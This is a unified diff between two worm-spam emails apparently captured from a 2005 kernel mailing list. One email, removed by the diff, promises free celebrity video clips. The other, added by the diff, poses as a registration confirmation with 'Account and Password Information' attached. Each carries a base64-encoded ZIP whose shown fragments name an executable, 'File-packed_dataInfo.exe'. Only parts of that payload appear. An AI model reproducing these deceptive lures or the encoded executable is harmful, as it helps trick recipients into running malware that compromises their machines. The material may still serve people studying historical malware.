@@ -1,30 +1,29 @@
-From: office@dokom.net
-Subject: Paris Hilton & Nicole Richie
-Date: Wed, 21 Dec 2005 01:06:34 UTC
-Message-ID: <4130491a5e.2893a5f8@dokom.net>
+From: hostmaster@arrowpoint.com
+Subject: Registration Confirmation
+Date: Wed, 21 Dec 2005 02:21:06 GMT
+Message-ID: <aaaa97d4f8a7ff3b@arrowpoint.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==c4ccd35cfda7"
+Content-Type: multipart/mixed; boundary="==cf9a4828663b8a4.65f"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: ralf@oss.sgi.com
+To: neilb@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==c4ccd35cfda7
+--==cf9a4828663b8a4.65f
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---==c4ccd35cfda7
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.arrowpoint.com
+***** Email: postman@arrowpoint.com
+--==cf9a4828663b8a4.65f
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==c4ccd35cfda7--
+--==cf9a4828663b8a4.65f--
